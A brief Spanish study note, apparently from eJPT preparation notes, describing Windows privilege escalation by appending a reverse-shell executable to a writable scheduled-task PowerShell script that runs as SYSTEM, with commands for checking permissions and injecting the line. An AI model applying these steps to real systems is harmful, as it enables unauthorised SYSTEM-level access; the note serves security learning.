
- Ver el contenido del script C:\DevTools\CleanUp.ps1:

```
type C:\DevTools\CleanUp.ps1
```

- El script parece estar ejecutándose como SYSTEM cada minuto. Usando accesschk.exe, tenga en cuenta que tiene la capacidad de escribir en este archivo:

```
C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
```

- Inicie un oyente en Kali y luego agregue una línea al C:\DevTools\CleanUp.ps1 que ejecuta el ejecutable reverse.exe que creó:

```
echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
```

- Espere a que se ejecute la Tarea Programada, que debería activar el shell inverso como SYSTEM.

enlace:
[[Local/Ciberseguridad/HACKING/CERTIFICACIONES/EJPT/Preparacion-Ejpt]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Windows/Herramientas]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Windows/Generate a Reverse Shell Executable]]